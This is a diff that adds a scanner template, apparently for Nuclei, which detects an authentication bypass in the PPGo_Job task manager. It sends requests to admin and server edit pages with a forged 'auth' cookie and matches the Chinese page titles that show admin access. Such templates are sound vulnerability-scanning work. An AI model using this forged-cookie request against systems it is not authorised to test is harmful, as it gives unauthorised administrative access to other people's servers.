@@ -1,0 +1,42 @@
+id: ppgo-job-auth-bypass
+
+info:
+  name: PPGo_Job Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    PPGo_Job is a task management system that has an authentication bypass vulnerability. Attackers can bypass authentication to access sensitive system information and potentially control the system.
+  tags: permission-bypass, auth, ppgo
+  reference:
+    - https://github.com/george518/PPGo_Job
+    - https://fofa.so
+
+http:
+  - raw:
+      - |
+        GET /admin/edit?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: auth=1|xxxx
+
+      - |
+        GET /server/edit?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: auth=1|xxxx
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "编辑管理员"
+        part: body
+
+      - type: word
+        words:
+          - "编辑执行资源"
+        part: body
+
+variables:
+  url_paths:
+    - /admin/edit?id=1
+    - /server/edit?id=1
+    - /task/detail?id=1
